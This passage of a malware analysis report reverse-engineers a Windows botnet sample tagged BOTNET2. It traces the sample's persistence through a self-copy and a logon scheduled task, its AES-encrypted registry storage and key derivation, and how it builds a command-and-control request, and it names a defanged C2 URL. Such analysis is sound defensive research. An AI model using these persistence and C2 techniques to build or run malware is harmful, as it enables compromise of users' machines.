    ;#define COMPRESSION_FORMAT_LZNT1         (0x0002)
0012F274  00C20000  debug027:unk_C20000         ;destination
0012F278  00013600                              ;uncompressed size
0012F27C  00C0857D  debug026:00C0857D           ;compressed buffer
0012F280  0000C76A                              ;compressed size
0012F284  0012F714  Stack[00000BBC]:0012F714    ;final uncompressed size
&lt;/pre&gt;
&lt;h2&gt;Stage 2&lt;/h2&gt;
&lt;ol&gt;
	&lt;li&gt;Collects data about the system;&lt;/li&gt;
	&lt;li&gt;Copies itself into a randomly named file located in the &quot;%AppData%\[random_path]\[random_file_name].exe&quot;;&lt;/li&gt;
	&lt;li&gt;Schedules a task that would run on the current user&#039;s next login;&lt;/li&gt;
	&lt;li&gt;Creates registry keys and stores AES encrypted data (collected in Step 1) in the registry;&lt;/li&gt;
	&lt;li&gt;Runs the next stage executable from the &quot;%AppData%\[random_path]\[random_file_name].exe&quot;.&lt;/li&gt;
&lt;/ol&gt;
An additional detail is that the malware collects data about the machine and creates an interesting structure. For example, on the test machine, the malware creates the following structure:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;00 00 02 00 00 00 06 00  03 3C 80 5E 96 58 91 B6
07 54 A4 00 00 00 03 00  00 00 37 36 34 38 37 2D
33 34 31 2D 38 36 31 39  31 30 33 2D 32 32 30 36
34 00 2C 00 00 00 41 32  32 2D 30 30 30 30 31 00
00 00 00 00 00 00 2C CC  C0 A8 22 31 A6 35 23 98
E5 97 52 11 03 00 00 00  00 00 45 53 07 54 50 6F
04 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 37 34 34 30 32 00
00 00 00 00 00 00 B8 03  00 00 80 5E 96 58 00 01
00 00 EA 32 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 2C 47 6C C7 00 BA  0D F0 AD BA 0D F0 AD BA

+0x02   dwNumberOfProcessors (SYSTEM_INFO) 
+0x06   wProcessorLevel      (SYSTEM_INFO)
+0x08   wProcessorRevision   (SYSTEM_INFO)
+0x0A   VolumeSerialNumber   
+0x0E   InstallDate 		&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion&quot;
+0x12   DigitalProductID	&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion&quot;&lt;/pre&gt;
An MD5 hash for the above structure is calculated and stored locally. ASCII and UNICODE strings representing formatted MD5 hashes are created. For example, on the test machine:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true&quot;&gt;00853D20  39 37 32 39 35 38 41 36  35 38 38 30 42 35 35 41  972958A65880B55A
00853D30  30 45 42 44 35 35 35 39  30 37 38 43 31 37 33 35  0EBD5559078C1735

00853E58  39 00 37 00 32 00 39 00  35 00 38 00 41 00 36 00  9.7.2.9.5.8.A.6.
00853E68  35 00 38 00 38 00 30 00  42 00 35 00 35 00 41 00  5.8.8.0.B.5.5.A.
00853E78  30 00 45 00 42 00 44 00  35 00 35 00 35 00 39 00  0.E.B.D.5.5.5.9.
00853E88  30 00 37 00 38 00 43 00  31 00 37 00 33 00 35 00  0.7.8.C.1.7.3.5.&lt;/pre&gt;
Both MD5 hashes are concatenated with the computer name (&#039;#&#039; is used as a separator). An MD5 hash of this data is calculated. This data becomes the unique GUID that is used by the malware. The malware uses the same algorithm, as it always produces the same result, but the result would be unique per infected system.

Next, the malware creates a randomly named path within &quot;%AppData%&quot; and copies itself into the randomly named executable file located in that directory. For example, on the test system, the malware created a copy of itself located at:

&quot;%AppData%\MfzxAHCb\HQHKWbsv\PMqLMKtj\oPQVNiRgs.exe&quot;

An MD5 hash of the newly created copy of the malware is calculated and stored along with the word BOTNET2:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true&quot;&gt;0012F628  8A 15 4F AE 3B 78 B4 8D  B1 71 C4 C9 49 99 E0 C0  è.O«;x¦.¦q-+IÖa+
0012F638  42 4F 54 4E 45 54 32 00  00 00 00 00 00 00 00 00  BOTNET2.........&lt;/pre&gt;
The malware creates a scheduled task that would run on the current user&#039;s next login. This is achieved by performing the following sequence of calls:
&lt;pre class=&quot;height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;1.CoCreateInstance (creates ITaskScheduler, CLSID {148bd52a-a2ab-11ce-b11f-00aa00530503}, 
  IID {148bd527-a2ab-11ce-b11f-00aa00530503}).
2.ITaskScheduler::NewWorkItem (creates ITask, CLSID_CTask {148BD520-A2AB-11CE-B11F-00AA00530503}, 
  IID_ITask {148BD524-A2AB-11CE-B11F-00AA00530503}).
3.ITask::SetFlags.
4.ITask:SetAccountInformation.
5.ITask::SetWorkingDirectory.
6.ITask::SetApplicationName.
7.ITask::SetMaxRunTime.
8.ITask::CreateTrigger.
9.ITaskTrigger:SetTrigger.
	;PTASK_TRIGGER:
	;Stack[00000F08]:0012E1BC 30 00                   dw 30h     ; cbTriggerSize
	;Stack[00000F08]:0012E1BE 00 00                   dw 0       ; Reserved
	...............................
	;Stack[00000F08]:0012E1D8 04 00 00 00             dd 4       ; rgFlags
	;Stack[00000F08]:0012E1DC 07 00 00 00             dd 7       ; TASK_EVENT_TRIGGER_AT_LOGON
	;Stack[00000F08]:0012E1E0 01 00 00 00             dd 1       ; Type
10.ITask::QueryInterface (CLSID_IPersistFile)
11.IPersistFile::Save.&lt;/pre&gt;
Creates the registry keys &quot;HKCU\\Software\\Classes\\CLSID\\{[unique_per_system_guid]}&quot;. Populates subkeys &quot;@&quot; , &quot;0&quot; and &quot;1&quot;. The data in the registry is encrypted using AES. The registry is used to pass data to the next stage. The AES key is derived from the hard-coded data:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true &quot;&gt;00854028  08 00 99 E3 72 5D A8 0E  FB DF A8 87 42 D4 AA AB  ..Öpr]¿.v¯¿çB+¬½
00854038  DE AD 35 3F 41 B9 80 5D  85 D4 2E A1 00 E6 E1 8C  ¦¡5?A¦Ç]à+.í.µßî
00854048  31 00 01 00 53 C3 00 00  39 37 32 39 35 38 41 36  1...S+.&lt;/pre&gt;
The derived key is:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true &quot;&gt;0012E750  E3 99 00 08 0E A8 5D 72  87 A8 DF FB AB AA D4 42  pÖ...¿]rç¿¯v½¬+B&lt;/pre&gt;
The algorithm for key derivation is:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;.text:0040EA85 0F B6 79 FE             movzx   edi, byte ptr [ecx-2]
.text:0040EA89 0F B6 59 FF             movzx   ebx, byte ptr [ecx-1]
.text:0040EA8D C1 E7 08                shl     edi, 8
.text:0040EA90 0B FB                   or      edi, ebx
.text:0040EA92 0F B6 19                movzx   ebx, byte ptr [ecx]
.text:0040EA95 C1 E7 08                shl     edi, 8
.text:0040EA98 0B FB                   or      edi, ebx
.text:0040EA9A 0F B6 59 01             movzx   ebx, byte ptr [ecx+1]
.text:0040EA9E C1 E7 08                shl     edi, 8
.text:0040EAA1 0B FB                   or      edi, ebx
.text:0040EAA3 89 3C 96                mov     [esi+edx*4], edi
.text:0040EAA6 42                      inc     edx
.text:0040EAA7 83 C1 04                add     ecx, 4
.text:0040EAAA 83 FA 04                cmp     edx, 4
.text:0040EAAD 7C D6                   jl      short loc_40EA85&lt;/pre&gt;
Next, the malware runs a copy of itself located in the &quot;%AppData%&quot; directory:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;.text:00403BA1 8D 55 E4                lea     edx, [ebp+var_1C]
.text:00403BA4 52                      push    edx                        ; lpProcessInformation
.text:00403BA5 8D 45 8C                lea     eax, [ebp+StartupInfo]
.text:00403BA8 50                      push    eax                        ; lpStartupInfo
.text:00403BA9 53                      push    ebx                        ; lpCurrentDirectory
.text:00403BAA 53                      push    ebx                        ; lpEnvironment
.text:00403BAB 68 00 00 00 04          push    CREATE_DEFAULT_ERROR_MODE  ; dwCreationFlags
.text:00403BB0 53                      push    ebx                        ; bInheritHandles
.text:00403BB1 53                      push    ebx                        ; lpThreadAttributes
.text:00403BB2 53                      push    ebx                        ; lpProcessAttributes
.text:00403BB3 68 F0 19 41 00          push    offset CommandLine         ; lpCommandLine
.text:00403BB8 8D 8D 79 FC FF FF       lea     ecx, [ebp+MultiByteStr]
.text:00403BBE 51                      push    ecx                        ; lpApplicationName
    ;&quot;%AppData%\MfzxAHCb\HQHKWbsv\PMqLMKtj\oPQVNiRgs.exe&quot;.
.text:00403BBF 89 5D E4                mov     [ebp+var_1C], ebx
.text:00403BC2 89 5D E8                mov     [ebp+var_18], ebx
.text:00403BC5 89 5D EC                mov     [ebp+var_14], ebx
.text:00403BC8 89 5D F0                mov     [ebp+var_10], ebx
.text:00403BCB C7 45 8C 44 00 00 00    mov     [ebp+StartupInfo.cb], 44h
.text:00403BD2 FF 15 60 10 41 00       call    ds:CreateProcessA&lt;/pre&gt;
&lt;h2&gt;Stage 3&lt;/h2&gt;
This stage creates a payload for the initial C&amp;C request and sends it. Details of the payload creation and malware logic for Stage 3 follow.

The malware calculates computer-specific data (as described in Stage 2) and compares the result to the data stored in &quot;KEY_CURRENT_USER\Software\Classes\CLSID\{[computer_unique_guid]}&quot;. If equal, the malware proceeds to the next stage.

Data stored in the registry &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\{[computer_unique_guid]}\0&quot; is enumerated. For example, on the test machine, the size of the data is 0x170, and the encrypted data stored in the registry is:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;00854B78  5F 1D B6 44 5B 87 A7 2E  74 81 51 7F 34 CA CC 9D  _.¦D[çº.t.Q.4-¦.
00854B88  FC 74 61 04 C2 61 9E 99  E5 A7 64 02 8E D2 79 05  nta.-aPÖsºd.Ä-y.
00854B98  68 41 E1 33 96 C7 B7 EB  83 35 07 43 47 1A A8 74  hAß3û¦+dâ5.CG.¿t
00854BA8  F7 CC B0 27 73 7A 7E 63  60 D7 5B AB 43 1B 41 65  ˜¦¦&#039;sz~c`+[½C.Ae
00854BB8  7F D1 A6 8B 85 B1 DE E4  B2 B5 A7 7E 74 B6 44 14  .-ªïà¦¦S¦¦º~t¦D.
00854BC8  B5 B8 D3 56 D3 0A 72 CC  62 BF 64 F4 3F 4D F1 D8  ¦++V+.r¦b+d(?M±+
00854BD8  84 2B 45 B8 DB BA 22 C2  B5 95 34 FA 69 85 A6 01  ä+E+¦¦&quot;-¦ò4·iàª.
00854BE8  02 80 29 90 60 A9 11 13  C3 77 31 6E 06 23 BA 3A  .Ç).`¬..+w1n.#¦:
00854BF8  64 D5 78 FA 2C E3 E5 3A  2B 18 4C 1F 74 31 B3 25  d+x·,ps:+.L.t1¦%
00854C08  BF 78 2C 45 4F 71 F6 F1  B4 5D 16 E3 CD 40 60 B8  +x,EOq÷±¦].p-@`+
00854C18  D9 7B CE AF 87 4F 88 75  FB CC DB 8F AA 33 CF 46  +{+»çOêuv¦¦.¬3-F
00854C28  3D 5D 7C 46 85 B5 92 33  B7 B8 E8 E9 5D 88 17 31  =]|Fà¦Æ3++FT]ê.1
00854C38  46 76 F4 EA 05 D2 71 04  55 B0 BF B3 A1 E9 9C BF  Fv(O.-q.U¦+¦íT£+
00854C48  E7 E6 5A 51 C5 F1 4A DF  CF 46 8B 4F 54 57 57 4F  tµZQ+±J¯-FïOTWWO
00854C58  6E EF 29 C1 BC C0 32 14  B5 3D 84 4C 87 7A 73 BA  nn)-++2.¦=äLçzs¦
00854C68  40 B2 06 B7 42 85 7C 44  65 1E EE 69 2F 7E 37 B8  @¦.+Bà|De.ei/~7+
00854C78  E5 A6 CC 26 06 9D 32 B3  71 7E D0 13 45 CF 01 D9  sª¦&amp;..2¦q~-.E-.+
00854C88  77 DA 8C 8E 90 3D 0E D1  F7 FE B1 24 99 20 89 C7  w+îÄ.=.-˜¦¦$Ö ë¦
00854C98  41 1D DA 62 66 08 AF 48  C9 F8 5C F8 3D 83 7E 92  A.+bf.»H+°\°=â~Æ
00854CA8  BF 8C 18 49 CA 81 CE 77  48 93 04 A3 B1 9D 07 60  +î.I-.+wHô.ú¦..`
00854CB8  5B CE A7 0D 23 09 B6 8D  7E 2E B9 B9 1A 73 3E 84  [+º.#.¦.~.¦¦.s&gt;ä
00854CC8  21 9C EF 83 41 66 72 E1  61 4A 4D 62 4E 0E FF FE  !£nâAfrßaJMbN. ¦
00854CD8  C9 F2 15 3B BC 38 11 A2  2B 0C 35 CF F4 EB 35 E5  +=.;+8.ó+.5-(d5s&lt;/pre&gt;
The decrypted data is:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;00854E90  00 00 00 00 67 01 00 00  A6 69 46 69 72 73 74 54  ....g...ªiFirstT
00854EA0  69 6D 65 01 6E 6D 6F 64  75 6C 65 73 46 65 74 63  ime.nmodulesFetc
00854EB0  68 65 64 00 66 48 61 73  68 50 45 50 8A 15 4F AE  hed.fHashPEPè.O«
00854EC0  3B 78 B4 8D B1 71 C4 C9  49 99 E0 C0 6C 73 7A 42  ;x¦.¦q-+IÖa+lszB
00854ED0  6F 74 6E 65 74 4E 61 6D  65 67 42 4F 54 4E 45 54  otnetNamegBOTNET
00854EE0  32 6D 73 7A 49 6E 73 74  61 6C 6C 50 61 74 68 78  2mszInstallPathx
00854EF0  55 43 3A 5C 44 6F 63 75  6D 65 6E 74 73 20 61 6E  UC:\Documents an
00854F00  64 20 53 65 74 74 69 6E  67 73 5C 69 5C 41 70 70  d Settings\i\App
00854F10  6C 69 63 61 74 69 6F 6E  20 44 61 74 61 5C 4D 66  lication Data\Mf
00854F20  7A 78 41 48 43 62 5C 48  51 48 4B 57 62 73 76 5C  zxAHCb\HQHKWbsv\
00854F30  50 4D 71 4C 4D 4B 74 6A  5C 6F 50 51 56 4E 69 52  PMqLMKtj\oPQVNiR
00854F40  67 73 2E 65 78 65 6C 77  49 6E 73 74 61 6C 6C 50  gs.exelwInstallP
00854F50  61 74 68 58 AA 43 00 3A  00 5C 00 44 00 6F 00 63  athX¬C.:.\.D.o.c
00854F60  00 75 00 6D 00 65 00 6E  00 74 00 73 00 20 00 61  .u.m.e.n.t.s. .a
00854F70  00 6E 00 64 00 20 00 53  00 65 00 74 00 74 00 69  .n.d. .S.e.t.t.i
00854F80  00 6E 00 67 00 73 00 5C  00 69 00 5C 00 41 00 70  .n.g.s.\.i.\.A.p
00854F90  00 70 00 6C 00 69 00 63  00 61 00 74 00 69 00 6F  .p.l.i.c.a.t.i.o
00854FA0  00 6E 00 20 00 44 00 61  00 74 00 61 00 5C 00 4D  .n. .D.a.t.a.\.M
00854FB0  00 66 00 7A 00 78 00 41  00 48 00 43 00 62 00 5C  .f.z.x.A.H.C.b.\
00854FC0  00 48 00 51 00 48 00 4B  00 57 00 62 00 73 00 76  .H.Q.H.K.W.b.s.v
00854FD0  00 5C 00 50 00 4D 00 71  00 4C 00 4D 00 4B 00 74  .\.P.M.q.L.M.K.t
00854FE0  00 6A 00 5C 00 6F 00 50  00 51 00 56 00 4E 00 69  .j.\.o.P.Q.V.N.i
00854FF0  00 52 00 67 00 73 00 2E  00 65 00 78 00 65 00 00  .R.g.s...e.x.e..

bytes 0 - 3 zeroes,
bytes 4 - 7 the length of the data
bytes 8 - ? data itself.&lt;/pre&gt;
Next, the data is tokenized:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;00854D08  01 00 00 00 00 00 00 00  8A 15 4F AE 3B 78 B4 8D  ........è.O«;x¦.
00854D18  B1 71 C4 C9 49 99 E0 C0  42 4F 54 4E 45 54 32 00  ¦q-+IÖa+BOTNET2.
............................................................................
00854E18  00 00 00 00 00 00 00 00  00 00 00 00 00 43 3A 5C  .............C:\
00854E28  44 6F 63 75 6D 65 6E 74  73 20 61 6E 64 20 53 65  Documents and Se
00854E38  74 74 69 6E 67 73 5C 69  5C 41 70 70 6C 69 63 61  ttings\i\Applica
00854E48  74 69 6F 6E 20 44 61 74  61 5C 4D 66 7A 78 41 48  tion Data\MfzxAH
00854E58  43 62 5C 48 51 48 4B 57  62 73 76 5C 50 4D 71 4C  Cb\HQHKWbsv\PMqL
00854E68  4D 4B 74 6A 5C 6F 50 51  56 4E 69 52 67 73 2E 65  MKtj\oPQVNiRgs.e
00854E78  78 65 00 00 00 00 00 00  00 00 00 00 00 00 00 00  xe..............
............................................................................
00854F28  00 00 43 00 3A 00 5C 00  44 00 6F 00 63 00 75 00  ..C.:.\.D.o.c.u.
00854F38  6D 00 65 00 6E 00 74 00  73 00 20 00 61 00 6E 00  m.e.n.t.s. .a.n.
00854F48  64 00 20 00 53 00 65 00  74 00 74 00 69 00 6E 00  d. .S.e.t.t.i.n.
00854F58  67 00 73 00 5C 00 69 00  5C 00 41 00 70 00 70 00  g.s.\.i.\.A.p.p.
00854F68  6C 00 69 00 63 00 61 00  74 00 69 00 6F 00 6E 00  l.i.c.a.t.i.o.n.
00854F78  20 00 44 00 61 00 74 00  61 00 5C 00 4D 00 66 00   .D.a.t.a.\.M.f.
00854F88  7A 00 78 00 41 00 48 00  43 00 62 00 5C 00 48 00  z.x.A.H.C.b.\.H.
00854F98  51 00 48 00 4B 00 57 00  62 00 73 00 76 00 5C 00  Q.H.K.W.b.s.v.\.
00854FA8  50 00 4D 00 71 00 4C 00  4D 00 4B 00 74 00 6A 00  P.M.q.L.M.K.t.j.
00854FB8  5C 00 6F 00 50 00 51 00  56 00 4E 00 69 00 52 00  \.o.P.Q.V.N.i.R.
00854FC8  67 00 73 00 2E 00 65 00  78 00 65 00 00 00 00 00  g.s...e.x.e.....&lt;/pre&gt;
The same operation is performed on the data stored in &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\{[computer_unique_guid]}\1&quot;. An interesting structure containing pointers to the domain names and common request page are stored in the local array-like structure:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true &quot;&gt;00855EF8  90 67 85 00 D0 67 85 00  10 68 85 00 48 68 85 00  .gà.-gà..hà.Hhà.
00855F08  2F 6E 65 74 72 65 70 6F  72 74 2E 70 68 70 00 00  /netreport.php..
&lt;/pre&gt;
Next, the following interesting function is called:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true&quot;&gt;.text:0040FB1B 50                      push    eax                  ; void *
.text:0040FB1C 51                      push    ecx                  ; int
	;db &#039;I-C957A26036A04#972958A65880B55A0EBD5559078C1735&#039;,0
    ;this is computer_name#md5hash as described in the dump.txt
.text:0040FB1D 57                      push    edi                  ; int 
	;&#039;hxxp://soft.kcssoft.biz/netreport.php&#039;,0
.text:0040FB1E E8 FD FE FF FF          call    c2&lt;/pre&gt;
The first thing the malware does within this function is create a payload for the C&amp;C request. For example, on the test machine, the first part of the plaintext payload (length 0x123) is:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;00856A90  82 A7 69 6C 70 73 7A 42  6F 74 49 44 78 30 49 2D  éºilpszBotIDx0I-
00856AA0  43 39 35 37 41 32 36 30  33 36 41 30 34 23 39 37  C957A26036A04#97
00856AB0  32 39 35 38 41 36 35 38  38 30 42 35 35 41 30 45  2958A65880B55A0E
00856AC0  42 44 35 35 35 39 30 37  38 43 31 37 33 35 6B 6C  BD5559078C1735kl
00856AD0  70 73 7A 56 65 72 73 69  6F 6E 67 32 2E 30 2E 30  pszVersiong2.0.0
00856AE0  2E 30 68 6D 61 69 6E 54  79 70 65 00 67 73 75 62  .0hmainType.gsub
00856AF0  54 79 70 65 00 67 42 69  74 6E 65 73 73 18 20 6B  Type.gBitness. k
00856B00  64 77 54 69 6D 65 73 74  61 6D 70 00 64 44 61 74  dwTimestamp.dDat
00856B10  61 A2 66 4C 65 6E 67 74  68 00 66 6C 70 44 61 74  aófLength.flpDat
00856B20  61 40 A7 69 6C 70 73 7A  42 6F 74 49 44 78 30 49  a@ºilpszBotIDx0I
00856B30  2D 43 39 35 37 41 32 36  30 33 36 41 30 34 23 39  -C957A26036A04#9
00856B40  37 32 39 35 38 41 36 35  38 38 30 42 35 35 41 30  72958A65880B55A0
00856B50  45 42 44 35 35 35 39 30  37 38 43 31 37 33 35 6B  EBD5559078C1735k
00856B60  6C 70 73 7A 56 65 72 73  69 6F 6E 67 32 2E 30 2E  lpszVersiong2.0.
00856B70  30 2E 30 68 6D 61 69 6E  54 79 70 65 00 67 73 75  0.0hmainType.gsu
00856B80  62 54 79 70 65 01 67 42  69 74 6E 65 73 73 18 20  bType.gBitness.
00856B90  6B 64 77 54 69 6D 65 73  74 61 6D 70 00 64 44 61  kdwTimestamp.dDa
00856BA0  74 61 A2 66 4C 65 6E 67  74 68 00 66 6C 70 44 61  taófLength.flpDa
00856BB0  74 61 40 00 									    ta@&lt;/pre&gt;
The data has the following format: &quot;string&quot; + data + 1-character separator. For example, &quot;pszBotID&quot; (string) + &quot;x0I-C957A26036A04#972958A65880B55A0EBD5559078C1735&quot; (data) + &quot;k&quot; (separator; changes for other entries). The malware generates a pseudorandom 9-byte character string and appends it to the data above:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;014CE6D8  09 00 00 00 79 78 65 46  5A 72 76 63 78 82 A7 69  ....yxeFZrvcxéºi
014CE6E8  6C 70 73 7A 42 6F 74 49  44 78 30 49 2D 43 39 35  lpszBotIDx0I-C95
014CE6F8  37 41 32 36 30 33 36 41  30 34 23 39 37 32 39 35  7A26036A04#97295
014CE708  38 41 36 35 38 38 30 42  35 35 41 30 45 42 44 35  8A65880B55A0EBD5
014CE718  35 35 39 30 37 38 43 31  37 33 35 6B 6C 70 73 7A  559078C1735klpsz
014CE728  56 65 72 73 69 6F 6E 67  32 2E 30 2E 30 2E 30 68  Versiong2.0.0.0h
014CE738  6D 61 69 6E 54 79 70 65  00 67 73 75 62 54 79 70  mainType.gsubTyp
014CE748  65 00 67 42 69 74 6E 65  73 73 18 20 6B 64 77 54  e.gBitness. kdwT
014CE758  69 6D 65 73 74 61 6D 70  00 64 44 61 74 61 A2 66  imestamp.dDataóf
014CE768  4C 65 6E 67 74 68 00 66  6C 70 44 61 74 61 40 A7  Length.flpData@º
014CE778  69 6C 70 73 7A 42 6F 74  49 44 78 30 49 2D 43 39  ilpszBotIDx0I-C9
014CE788  35 37 41 32 36 30 33 36  41 30 34 23 39 37 32 39  57A26036A04#9729
014CE798  35 38 41 36 35 38 38 30  42 35 35 41 30 45 42 44  58A65880B55A0EBD
014CE7A8  35 35 35 39 30 37 38 43  31 37 33 35 6B 6C 70 73  5559078C1735klps
014CE7B8  7A 56 65 72 73 69 6F 6E  67 32 2E 30 2E 30 2E 30  zVersiong2.0.0.0
014CE7C8  68 6D 61 69 6E 54 79 70  65 00 67 73 75 62 54 79  hmainType.gsubTy
014CE7D8  70 65 01 67 42 69 74 6E  65 73 73 18 20 6B 64 77  pe.gBitness. kdw
014CE7E8  54 69 6D 65 73 74 61 6D  70 00 64 44 61 74 61 A2  Timestamp.dDataó
014CE7F8  66 4C 65 6E 67 74 68 00  66 6C 70 44 61 74 61 40  fLength.flpData@

+00     length of the random string (9)
+04     pseudo-randomly generated  9 bytes string.
+0D     0
+0E     data (here  data size is 0x123, total structure size is 0x130)&lt;/pre&gt;
An additional, 9-byte-long, pseudorandom string is generated:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true &quot;&gt;0012D6D8  78 6A 79 4C 4A 5A 51 61  64 00 00 00 30 D7 12 00  xjyLJZQad&lt;/pre&gt;
An MD5 hash of the string is calculated:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true &quot;&gt;0012D6BC  52 37 D7 C2 07 D1 D3 C6  B5 26 F4 FF AC 29 CF CB  R7+-.-+¦¦&amp;( ¼)--&lt;/pre&gt;
The above blob of data is encrypted using AES. The MD5 hash of the second pseudorandom string is used as the key:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;014CFBD0  99 76 C5 58 A7 34 93 BC  54 A6 85 54 DF 79 F6 1A  Öv+Xº4ô+TªàT¯y÷.
014CFBE0  B9 A2 47 46 1A FE 81 49  22 77 02 A2 10 ED EF 2D  ¦óGF.¦.I&quot;w.ó.fn-
014CFBF0  41 43 25 91 3E 3A F7 DE  9F C2 C8 EB FC 07 75 0F  AC%æ&gt;:˜¦ƒ-+dn.u.
014CFC00  87 44 01 66 9F 1B 54 7D  A0 64 D8 02 6C C1 ED BA  çD.fƒ.T}ád+.l-f¦
014CFC10  56 DD BA 5F 63 2A 2C 01  B0 89 D4 19 FF 3F 4F 66  V¦¦_c*,.¦ë+. ?Of
014CFC20  54 5A 80 94 81 DA 1E 93  61 66 52 B4 B7 B5 45 09  TZÇö.+.ôafR¦+¦E.
014CFC30  B2 52 D1 37 2A 19 40 C3  77 07 EB B9 C2 B4 23 7D  ¦R-7*.@+w.d¦-¦#}
014CFC40  10 31 8B A9 2E F1 4E 5E  67 46 09 8B 1C 5B ED F1  .1ï¬.±N^gF.ï.[f±
014CFC50  07 C8 DB 3D 71 3A A8 96  58 F2 95 10 F0 D8 89 33  .+¦=q:¿ûX=ò.=+ë3
014CFC60  11 41 26 AD BD 99 A5 79  9A 11 DE A5 17 2A 68 86  .A&amp;¡+ÖÑyÜ.¦Ñ.*hå
014CFC70  88 C0 03 04 EF 59 5C 7E  D4 9F 13 7F D2 90 B5 2A  ê+..nY\~+ƒ..-.¦*
014CFC80  00 37 D6 08 91 CD 76 DD  9B EF CD B3 61 BF 66 D5  .7+.æ-v¦¢n-¦a+f+
014CFC90  9B C4 B3 6B 49 41 F7 E8  34 39 64 17 5F CA AC 8B  ¢-¦kIA˜F49d._-¼ï
014CFCA0  1A C2 81 1F 23 09 15 C7  01 6F 51 61 74 93 79 28  .-..#..¦.oQatôy(
014CFCB0  EA B8 74 28 D2 7F 09 34  CC C2 01 CE 5B 94 F0 3C  O+t(-..4¦-.+[ö=&lt;
014CFCC0  EE 22 A9 3F C9 91 DC 0E  CB 98 D0 06 8B 25 A8 CA  e&quot;¬?+æ_.-ÿ-.ï%¿-
014CFCD0  73 43 E1 86 88 03 AB 34  83 E3 FC 6A EA 01 57 52  sCßåê.½4âpnjO.WR
014CFCE0  EB A8 52 3C 8A 7D 13 23  6F B0 DA 08 FC 90 31 98  d¿R&lt;è}.#o¦+.n.1ÿ
014CFCF0  FD E4 C4 DF 75 CE DC B6  DA DD B7 23 7C A8 A0 9B  ²S-¯u+_¦+¦+#|¿á¢&lt;/pre&gt;
The following data is generated based on the hard-coded data used to generate the initial AES key for encrypting data in the registry:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;014CE830  AA 00 00 00 08 00 CC F6  B7 9B 80 C0 6A 76 81 52  ¬.....¦÷+¢Ç+jv.R
014CE840  CA E5 6C EA 1C 81 C8 DD  56 FD 6B D4 99 71 5E 9D  -slO..+¦V²k+Öq^.
014CE850  A1 DF B2 2A 28 00 08 00  8A 78 46 D8 AA F0 D1 BB  í¯¦*(...èxF+¬=-+
014CE860  64 A3 45 4C 43 94 C5 8F  ED A1 03 BD 1A 8A 38 5D  dúELCö+.fí.+.è8]
014CE870  19 F0 DA 08 E7 24 22 00  08 00 FA 8A 21 0E 84 DF  .=+.t$&quot;...·è!.ä¯
014CE880  CE 54 FD 53 75 AB 3D 1F  99 23 43 9E 39 AE A2 55  +T²Su½=.Ö#CP9«óU
014CE890  2C 15 09 DB 0E F2 A4 59  1A 00 08 00 88 26 CF E5  ,..¦.=ñY....ê&amp;-s
014CE8A0  D4 71 5A D6 74 98 72 D0  5E 8C A6 F3 A1 CF 9C 5B  +qZ+tÿr-^îª=í-£[
014CE8B0  A7 5D 4C B0 FA B7 39 C2  7B A2 30 00 08 00 A4 06  º]L¦·+9-{ó0...ñ.
014CE8C0  D9 5E 85 2F D6 0B 94 36  79 56 B6 31 73 87 18 F8  +^à/+.ö6yV¦1sç.°
014CE8D0  69 8A FF 03 7F 20 82 20  14 28 51 E5 1A 00 AD BA  iè .. é .(Qs..¡¦&lt;/pre&gt;
This data is concatenated with the AES encrypted buffer:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;014CFD18  AA 00 00 00 08 00 CC F6  B7 9B 80 C0 6A 76 81 52  ¬.....¦÷+¢Ç+jv.R
014CFD28  CA E5 6C EA 1C 81 C8 DD  56 FD 6B D4 99 71 5E 9D  -slO..+¦V²k+Öq^.
014CFD38  A1 DF B2 2A 28 00 08 00  8A 78 46 D8 AA F0 D1 BB  í¯¦*(...èxF+¬=-+
014CFD48  64 A3 45 4C 43 94 C5 8F  ED A1 03 BD 1A 8A 38 5D  dúELCö+.fí.+.è8]
014CFD58  19 F0 DA 08 E7 24 22 00  08 00 FA 8A 21 0E 84 DF  .=+.t$&quot;...·è!.ä¯
014CFD68  CE 54 FD 53 75 AB 3D 1F  99 23 43 9E 39 AE A2 55  +T²Su½=.Ö#CP9«óU
014CFD78  2C 15 09 DB 0E F2 A4 59  1A 00 08 00 88 26 CF E5  ,..¦.=ñY....ê&amp;-s
014CFD88  D4 71 5A D6 74 98 72 D0  5E 8C A6 F3 A1 CF 9C 5B  +qZ+tÿr-^îª=í-£[
014CFD98  A7 5D 4C B0 FA B7 39 C2  7B A2 30 00 08 00 A4 06  º]L¦·+9-{ó0...ñ.
